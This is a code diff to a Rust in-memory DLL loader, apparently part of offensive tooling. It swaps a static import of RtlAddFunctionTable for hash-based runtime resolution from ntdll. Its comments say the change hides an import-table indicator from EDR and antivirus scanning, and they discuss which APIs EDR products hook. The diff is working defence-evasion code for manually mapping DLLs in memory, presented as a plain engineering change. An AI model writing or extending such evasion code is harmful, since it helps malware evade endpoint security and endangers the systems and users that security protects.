@@ -29,17 +29,11 @@ struct RuntimeFunction {
     unwind_info_address: u32,
 }
 
-#[cfg(target_arch = "x86_64")]
-extern "system" {
-    /// Registers a dynamic function table so the OS can unwind exceptions
-    /// inside memory-mapped code.  Declared here because winapi 0.3 does not
-    /// expose it at a stable path.
-    fn RtlAddFunctionTable(
-        function_table: *const RuntimeFunction,
-        entry_count: u32,
-        base_address: u64,
-    ) -> u8; // BOOLEAN
-}
+// P2-18: RtlAddFunctionTable is now resolved at runtime via pe_resolve
+// (hash-based API resolution from ntdll) rather than declared as an extern
+// static import.  This removes it from the IAT, avoiding a static analysis
+// indicator that could be flagged by EDR/AV scanning the module loader's
+// import table.
 
 // 1. Defining PEB and LDR structures to walk PEB
 
@@ -974,15 +968,13 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
     //     Without this, any C++ try/catch or SEH block in the DLL terminates
     //     the process instead of propagating to a handler.
     //
-    //     NOTE: RtlAddFunctionTable is retained as an IAT-visible extern call
-    //     (rather than dispatched through nt_syscall) because it is an ntdll
-    //     *runtime helper*, not an NT syscall.  It has no SSN and cannot be
-    //     invoked via the syscall instruction.  EDR solutions almost never hook
-    //     this function because it is a low-risk bookkeeping API that does not
-    //     touch process memory, handles, or the object manager — it simply
-    //     registers an unwind-info table with the Rtl dispatcher.  Hooking it
-    //     would break legitimate exception handling across all loaded modules
-    //     and would immediately flag the EDR as faulty.
+    //     P2-18: RtlAddFunctionTable is resolved at runtime from ntdll via
+    //     pe_resolve (hash-based API resolution) rather than linked as a
+    //     static import.  This eliminates the IAT entry, removing a static
+    //     analysis indicator while preserving runtime functionality.
+    //     RtlAddFunctionTable is an ntdll *runtime helper*, not an NT syscall,
+    //     so it has no SSN — but pe_resolve's hash-based lookup works for
+    //     any exported function, syscall or not.
     #[cfg(target_arch = "x86_64")]
     {
         for section in &pe.sections {
@@ -994,7 +986,34 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
                 // Each RUNTIME_FUNCTION entry is exactly 12 bytes.
                 let entry_count = (section.size_of_raw_data as usize / 12) as u32;
                 if entry_count > 0 {
-                    RtlAddFunctionTable(pdata_ptr, entry_count, image_base as u64);
+                    // P2-18: Resolve RtlAddFunctionTable from ntdll at runtime.
+                    let ntdll_base = pe_resolve::get_module_handle_by_hash(
+                        pe_resolve::hash_str(b"ntdll.dll\0"),
+                    );
+                    if let Some(base) = ntdll_base {
+                        let fn_addr = pe_resolve::get_proc_address_by_hash(
+                            base,
+                            pe_resolve::hash_str(b"RtlAddFunctionTable\0"),
+                        );
+                        if let Some(addr) = fn_addr {
+                            let rtl_add_fn_table: extern "system" fn(
+                                *const RuntimeFunction,
+                                u32,
+                                u64,
+                            ) -> u8 = std::mem::transmute(addr);
+                            rtl_add_fn_table(pdata_ptr, entry_count, image_base as u64);
+                        } else {
+                            tracing::warn!(
+                                "P2-18: failed to resolve RtlAddFunctionTable from ntdll; \
+                                 exception handling in mapped DLL may not work"
+                            );
+                        }
+                    } else {
+                        tracing::warn!(
+                            "P2-18: failed to resolve ntdll base; \
+                             exception handling in mapped DLL may not work"
+                        );
+                    }
                 }
                 break;
             }
